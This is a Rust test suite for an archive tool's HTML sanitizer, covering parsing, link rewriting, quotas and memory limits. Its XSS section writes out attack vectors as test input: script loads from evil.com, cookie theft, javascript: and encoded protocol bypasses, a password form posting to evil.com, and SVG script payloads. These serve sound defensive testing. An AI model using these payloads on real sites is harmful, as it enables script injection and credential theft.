// SPDX-License-Identifier: BSD-3-Clause OR Apache-2.0
//
// Copyright (c) 2026 Witt Kung <witt.w.kung@gmail.com>
// All rights reserved.
//
// TTZip: High-performance native archiving and compression engine.

//! W3C html5lib & lol-html Compliance and 6-Layer HTML Defense Test Suite.
//!
//! Comprehensive test suite validating:
//! 1. W3C HTML5 tag matching, attribute normalization, and void element parsing.
//! 2. LOL-HTML selector dispatch, element rewriting, and content transformation.
//! 3. 6-Layer Defense-in-Depth Adversarial Vectors:
//!    - Active Content & XSS Vector Defense (`<script>`, `<iframe>`, `on*` events, `javascript:` URIs, SVG vectors).
//!    - External Network Sandbox Isolation (`http/https` neutralization, `ttzip-vfs://` routing, CSP injection).
//!    - DOM Recursion & Tag Depth Ceilings (>64 levels, >256 unclosed tags).
//!    - Attribute Quota & Text Slice Memory Fuses (>128 attrs, >8KB attr, >64KB total, >1MB text chunk).
//!    - Resident Memory Budget Watchdog & 50 MiB Truncation Banner.
//!    - Sensitive HTML Buffer Volatile Zeroization & Memory Protection.

use ttzip_engine::security::html_defense::{
    AttributeQuotaGuard, AttributeQuotaReport, ExternalNetworkSandboxGuard, HtmlDefenseError,
    HtmlDefenseOptions, HtmlMemoryBudgetGuard, HtmlSanitizerGuard, HtmlSecurityPipeline,
    NetworkSandboxOptions, NetworkSandboxReport, SanitizerReport, SensitiveHtmlBuffer,
    TagNestingDepthGuard, DEFAULT_STRICT_CSP_CONTENT, HTML_TRUNCATION_BANNER,
};

// ============================================================================
// 1. W3C html5lib Compliance & Tag / Attribute Parsing Vectors
// ============================================================================

#[test]
fn test_w3c_html5_void_elements_do_not_nest() {
    let mut guard = TagNestingDepthGuard::new(64, 256);
    let void_tags = [
        "area", "base", "br", "col", "embed", "hr", "img", "input", "link", "meta", "param",
        "source", "track", "wbr",
    ];

    for tag in void_tags {
        assert!(TagNestingDepthGuard::is_void_tag(tag));
        guard.on_element_start(tag, false).unwrap();
        assert_eq!(guard.current_depth(), 0);
    }
}

#[test]
fn test_w3c_html5_case_insensitive_tags_and_attributes() {
    let pipeline = HtmlSecurityPipeline::default();
    let raw_html = r#"<DIV CLASS="container"><P ID="para">Hello <B>World</B></P></DIV>"#;
    let res = pipeline.sanitize_html(raw_html).expect("Sanitization failed");
    let out = res.sanitized_html.as_str().unwrap();

    assert!(out.contains("Hello"));
    assert!(out.contains("World"));
    assert_eq!(res.report.tag_depth.max_depth_reached, 3);
}

#[test]
fn test_w3c_html5_unclosed_and_misnested_tag_recovery() {
    let mut guard = TagNestingDepthGuard::new(64, 256);

    // <div><p><span></div> -> <div> closing unwinds span and p
    guard.on_element_start("div", false).unwrap();
    assert_eq!(guard.current_depth(), 1);
    guard.on_element_start("p", false).unwrap();
    assert_eq!(guard.current_depth(), 2);
    guard.on_element_start("span", false).unwrap();
    assert_eq!(guard.current_depth(), 3);

    guard.on_element_end("div").unwrap();
    assert_eq!(guard.current_depth(), 0);

    let report = guard.finalize().unwrap();
    assert_eq!(report.unclosed_tags_count, 2);
}

// ============================================================================
// 2. LOL-HTML Selector Dispatch & Attribute Rewriting Vectors
// ============================================================================

#[test]
fn test_lol_html_relative_resource_routing() {
    let pipeline = HtmlSecurityPipeline::new(HtmlDefenseOptions {
        vfs_prefix: "ttzip-vfs://archive_root/".to_string(),
        ..HtmlDefenseOptions::default()
    });

    let raw = r#"<html><head><link rel="stylesheet" href="styles/main.css"></head><body><img src="./images/logo.png"><img src="/root/banner.jpg"></body></html>"#;
    let res = pipeline.sanitize_html(raw).expect("Sanitization failed");
    let out = res.sanitized_html.as_str().unwrap();

    assert!(out.contains("ttzip-vfs://archive_root/styles/main.css"));
    assert!(out.contains("ttzip-vfs://archive_root/images/logo.png"));
    assert!(out.contains("ttzip-vfs://archive_root/root/banner.jpg"));
    assert_eq!(res.report.network_sandbox.rewritten_vfs_links_count, 3);
}

// ============================================================================
// 3. Guard 1: Active Content & XSS Adversarial Vectors
// ============================================================================

#[test]
fn test_standalone_sanitizer_guard_direct() {
    let guard = HtmlSanitizerGuard::new();
    let mut report = SanitizerReport::default();

    assert!(guard.is_forbidden_tag("script"));
    assert!(guard.is_forbidden_tag("IFRAME"));
    assert!(guard.is_forbidden_tag("object"));
    assert!(guard.is_forbidden_tag("embed"));
    assert!(guard.is_forbidden_tag("base"));
    assert!(guard.is_forbidden_tag("meta"));
    assert!(!guard.is_forbidden_tag("div"));

    assert!(HtmlSanitizerGuard::is_event_attribute("onclick"));
    assert!(HtmlSanitizerGuard::is_event_attribute("ONLOAD"));
    assert!(!HtmlSanitizerGuard::is_event_attribute("href"));

    let sanitized_event = guard.sanitize_attribute("onclick", "bad()", &mut report);
    assert_eq!(sanitized_event, None);
    assert_eq!(report.stripped_events_count, 1);

    let sanitized_js = guard.sanitize_attribute("href", "javascript:alert(1)", &mut report);
    assert_eq!(sanitized_js, None);
    assert_eq!(report.neutralized_protocols_count, 1);

    let safe_href = guard.sanitize_attribute("href", "page.html", &mut report);
    assert_eq!(safe_href, Some("page.html".to_string()));
}

#[test]
fn test_xss_script_tags_purged_completely() {
    let pipeline = HtmlSecurityPipeline::default();
    let vectors = [
        r#"<script>alert(1)</script>"#,
        r#"<SCRIPT SRC="http://evil.com/xss.js"></SCRIPT>"#,
        r#"<script type="text/javascript">document.cookie="stolen";</script>"#,
        r#"<div>Nested <script>console.log("bad");</script> content</div>"#,
    ];

    for vec in vectors {
        let res = pipeline.sanitize_html(vec).expect("Sanitization should pass");
        let out = res.sanitized_html.as_str().unwrap();
        assert!(!out.contains("<script"));
        assert!(!out.contains("alert"));
        assert!(!out.contains("xss.js"));
        assert!(!out.contains("stolen"));
    }
}

#[test]
fn test_xss_dangerous_tags_stripped() {
    let pipeline = HtmlSecurityPipeline::default();
    let vectors = [
        r#"<iframe src="https://phishing.site"></iframe>"#,
        r#"<object data="malware.swf"></object>"#,
        r#"<embed src="exploit.pdf">"#,
        r#"<applet code="Malicious.class"></applet>"#,
        r#"<base href="https://hijacked.domain/">"#,
        r#"<meta http-equiv="refresh" content="0;url=https://evil.com">"#,
        r#"<form action="https://evil.com/login"><input type="password"></form>"#,
    ];

    for vec in vectors {
        let res = pipeline.sanitize_html(vec).expect("Sanitization failed");
        let out = res.sanitized_html.as_str().unwrap();
        assert!(!out.contains("<iframe"));
        assert!(!out.contains("<object"));
        assert!(!out.contains("<embed"));
        assert!(!out.contains("<applet"));
        assert!(!out.contains("<base"));
        assert!(!out.contains("http-equiv=\"refresh\""));
        assert!(!out.contains("<form"));
        assert!(!out.contains("<input"));
    }
}

#[test]
fn test_xss_inline_event_handlers_stripped() {
    let pipeline = HtmlSecurityPipeline::default();
    let raw = r#"<div onload="init()" onclick="track()" onmouseover="peek()" onerror="oops()" onfocus="pwn()">Text</div>"#;
    let res = pipeline.sanitize_html(raw).expect("Sanitization failed");
    let out = res.sanitized_html.as_str().unwrap();

    assert!(!out.contains("onload"));
    assert!(!out.contains("onclick"));
    assert!(!out.contains("onmouseover"));
    assert!(!out.contains("onerror"));
    assert!(!out.contains("onfocus"));
    assert!(out.contains("Text"));
    assert_eq!(res.report.sanitizer.stripped_events_count, 5);
}

#[test]
fn test_xss_javascript_pseudo_protocols_neutralized() {
    let pipeline = HtmlSecurityPipeline::default();
    let vectors = [
        r#"<a href="javascript:alert(1)">Click</a>"#,
        r#"<a href="JAVASCRIPT:alert(2)">Click</a>"#,
        r#"<a href=" java script:alert(3)">Click</a>"#,
        r#"<a href="javascript&#x3a;alert(4)">Click</a>"#,
        r#"<a href="vbscript:msgbox(5)">Click</a>"#,
        r#"<a href="data:text/html,<script>alert(6)</script>">Click</a>"#,
    ];

    for vec in vectors {
        let res = pipeline.sanitize_html(vec).expect("Sanitization failed");
        let out = res.sanitized_html.as_str().unwrap();
        assert!(!out.contains("javascript:"));
        assert!(!out.contains("JAVASCRIPT:"));
        assert!(!out.contains("vbscript:"));
        assert!(!out.contains("data:text/html"));
    }
}

#[test]
fn test_xss_svg_payload_sanitization() {
    let pipeline = HtmlSecurityPipeline::default();
    let raw_svg = r#"<svg xmlns="http://www.w3.org/2000/svg"><script>alert('svg-xss')</script><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(2)</script></body></foreignObject><circle cx="50" cy="50" r="40" onload="alert(3)"/></svg>"#;
    let res = pipeline.sanitize_html(raw_svg).expect("Sanitization failed");
    let out = res.sanitized_html.as_str().unwrap();

    assert!(!out.contains("<script"));
    assert!(!out.contains("foreignObject"));
    assert!(!out.contains("onload"));
    assert!(out.contains("<circle"));
}

// ============================================================================
// 4. Guard 2: External Network Sandbox & CSP Injection Vectors
// ============================================================================

#[test]
fn test_standalone_network_sandbox_guard_direct() {
    let options = NetworkSandboxOptions {
        vfs_prefix: "ttzip-vfs://my_archive/".to_string(),
        inject_csp: true,
        custom_csp: Some("default-src 'none';".to_string()),
        block_external_network: true,
    };
    let guard = ExternalNetworkSandboxGuard::new(options);
    let mut report = NetworkSandboxReport::default();

    assert!(ExternalNetworkSandboxGuard::is_external_uri("http://remote.com"));
    assert!(ExternalNetworkSandboxGuard::is_external_uri("https://remote.com"));
    assert!(ExternalNetworkSandboxGuard::is_external_uri("//cdn.com/asset.js"));
    assert!(!ExternalNetworkSandboxGuard::is_external_uri("./relative.png"));

    let rewritten_remote = guard.sanitize_and_rewrite_uri("https://malicious.com", &mut report);
    assert_eq!(rewritten_remote, "#ttzip-blocked-external-url");
    assert_eq!(report.neutralized_external_links_count, 1);

    let rewritten_local = guard.sanitize_and_rewrite_uri("images/photo.jpg", &mut report);
    assert_eq!(rewritten_local, "ttzip-vfs://my_archive/images/photo.jpg");
    assert_eq!(report.rewritten_vfs_links_count, 1);
}

#[test]
fn test_network_sandbox_external_url_neutralization() {
    let pipeline = HtmlSecurityPipeline::default();
    let raw = r#"<div><a href="https://google.com">Search</a><img src="http://cdn.com/a.jpg"><link href="//cdn.net/b.css"><a href="ftp://files.org/a.zip">FTP</a></div>"#;
    let res = pipeline.sanitize_html(raw).expect("Sanitization failed");
    let out = res.sanitized_html.as_str().unwrap();

    assert!(!out.contains("https://google.com"));
    assert!(!out.contains("http://cdn.com/a.jpg"));
    assert!(!out.contains("//cdn.net/b.css"));
    assert!(!out.contains("ftp://files.org/a.zip"));
    assert!(out.contains("#ttzip-blocked-external-url"));
    assert_eq!(res.report.network_sandbox.neutralized_external_links_count, 4);
}

#[test]
fn test_network_sandbox_csp_injection_in_head_and_missing_head() {
    let pipeline = HtmlSecurityPipeline::default();

    // 1. With <head>
    let html_with_head = "<html><head><title>Doc</title></head><body>Content</body></html>";
    let res1 = pipeline.sanitize_html(html_with_head).unwrap();
    let out1 = res1.sanitized_html.as_str().unwrap();
    assert!(out1.contains(r#"<meta http-equiv="Content-Security-Policy""#));
    assert!(out1.contains(DEFAULT_STRICT_CSP_CONTENT));
    assert!(res1.report.network_sandbox.csp_injected);

    // 2. Without <head> or <html>
    let plain_body = "<div>Bare markup without document skeleton</div>";
    let res2 = pipeline.sanitize_html(plain_body).unwrap();
    let out2 = res2.sanitized_html.as_str().unwrap();
    assert!(out2.contains(r#"<meta http-equiv="Content-Security-Policy""#));
    assert!(res2.report.network_sandbox.csp_injected);
}

// ============================================================================
// 5. Guard 3: Tag Nesting Depth & Unclosed Quota Vectors
// ============================================================================

#[test]
fn test_tag_depth_limit_trip_at_ceiling() {
    let pipeline = HtmlSecurityPipeline::new(HtmlDefenseOptions {
        max_depth: 8,
        ..HtmlDefenseOptions::default()
    });

    let mut deep_html = String::new();
    for _ in 0..9 {
        deep_html.push_str("<div>");
    }
    deep_html.push_str("Payload");
    for _ in 0..9 {
        deep_html.push_str("</div>");
    }

    let err = pipeline.sanitize_html(&deep_html).unwrap_err();
    match err {
        HtmlDefenseError::TagDepthLimitExceeded { depth, max_depth } => {
            assert_eq!(depth, 9);
            assert_eq!(max_depth, 8);
        }
        other => panic!("Expected TagDepthLimitExceeded, got {other:?}"),
    }
}

#[test]
fn test_unclosed_tag_quota_trip() {
    let mut depth_guard = TagNestingDepthGuard::new(64, 4);

    // Push 5 unclosed tags
    for i in 0..5 {
        depth_guard.on_element_start(&format!("tag{i}"), false).unwrap();
    }

    let err = depth_guard.finalize().unwrap_err();
    match err {
        HtmlDefenseError::UnclosedTagQuotaExceeded { count, max_quota } => {
            assert_eq!(count, 5);
            assert_eq!(max_quota, 4);
        }
        other => panic!("Expected UnclosedTagQuotaExceeded, got {other:?}"),
    }
}

// ============================================================================
// 6. Guard 4: Attribute Quota & Text Slice Memory Fuse Vectors
// ============================================================================

#[test]
fn test_attribute_count_quota_trip() {
    let pipeline = HtmlSecurityPipeline::new(HtmlDefenseOptions {
        max_attributes_per_element: 5,
        ..HtmlDefenseOptions::default()
    });

    let html = r#"<div a="1" b="2" c="3" d="4" e="5" f="6">Many attributes</div>"#;
    let err = pipeline.sanitize_html(html).unwrap_err();
    match err {
        HtmlDefenseError::AttributeCountExceeded { count, max } => {
            assert_eq!(count, 6);
            assert_eq!(max, 5);
        }
        other => panic!("Expected AttributeCountExceeded, got {other:?}"),
    }
}

#[test]
fn test_single_attribute_length_quota_trip() {
    let pipeline = HtmlSecurityPipeline::new(HtmlDefenseOptions {
        max_single_attribute_len: 32,
        ..HtmlDefenseOptions::default()
    });

    let big_attr_val = "x".repeat(40);
    let html = format!(r#"<div data-payload="{big_attr_val}">Content</div>"#);
    let err = pipeline.sanitize_html(&html).unwrap_err();
    match err {
        HtmlDefenseError::AttributeLengthExceeded { len, max } => {
            assert!(len > 32);
            assert_eq!(max, 32);
        }
        other => panic!("Expected AttributeLengthExceeded, got {other:?}"),
    }
}

#[test]
fn test_text_chunk_length_quota_trip() {
    let guard = AttributeQuotaGuard::new(128, 8192, 65536, 100);
    let mut report = AttributeQuotaReport::default();

    let huge_text = "A".repeat(150);
    let err = guard.validate_text_chunk(&huge_text, &mut report).unwrap_err();
    match err {
        HtmlDefenseError::TextChunkLengthExceeded { len, max } => {
            assert_eq!(len, 150);
            assert_eq!(max, 100);
        }
        other => panic!("Expected TextChunkLengthExceeded, got {other:?}"),
    }
}

// ============================================================================
// 7. Guard 5: Memory Budget Watchdog & Truncation Vectors
// ============================================================================

#[test]
fn test_memory_budget_exceeded_error() {
    let memory_guard = HtmlMemoryBudgetGuard::new(1024, 512);

    let _permit1 = memory_guard.allocate(800).unwrap();
    let err = memory_guard.allocate(400).unwrap_err();

    match err {
        HtmlDefenseError::MemoryBudgetExceeded {
            requested,
            current_allocated,
            limit,
        } => {
            assert_eq!(requested, 400);
            assert_eq!(current_allocated, 800);
            assert_eq!(limit, 1024);
        }
        other => panic!("Expected MemoryBudgetExceeded, got {other:?}"),
    }
}

#[test]
fn test_memory_budget_raii_release() {
    let memory_guard = HtmlMemoryBudgetGuard::new(1024, 512);
    {
        let _permit = memory_guard.allocate(500).unwrap();
        assert_eq!(memory_guard.current_usage(), 500);
    }
    assert_eq!(memory_guard.current_usage(), 0);
}

#[test]
fn test_truncation_threshold_and_banner_injection() {
    let memory_guard = HtmlMemoryBudgetGuard::new(10_000, 50);
    let input = "<div>Hello World 1234567890 1234567890 1234567890 1234567890 1234567890</div>";
    let (truncated, was_truncated) = memory_guard.truncate_with_banner(input);

    assert!(was_truncated);
    assert!(truncated.contains(HTML_TRUNCATION_BANNER));
}

// ============================================================================
// 8. Guard 6: Sensitive HTML Buffer Volatile Zeroization Vectors
// ============================================================================

#[test]
fn test_sensitive_html_buffer_operations() {
    let mut buf = SensitiveHtmlBuffer::from_string("<div>Secret Banking Statement</div>".to_string());
    assert_eq!(buf.len(), 35);
    assert!(!buf.is_empty());
    assert_eq!(buf.as_str().unwrap(), "<div>Secret Banking Statement</div>");

    let debug_repr = format!("{buf:?}");
    assert!(!debug_repr.contains("Banking"));
    assert!(debug_repr.contains("[REDACTED_SENSITIVE_HTML_PAYLOAD]"));

    buf.clear_and_zeroize();
    assert_eq!(buf.len(), 0);
    assert!(buf.is_empty());
}
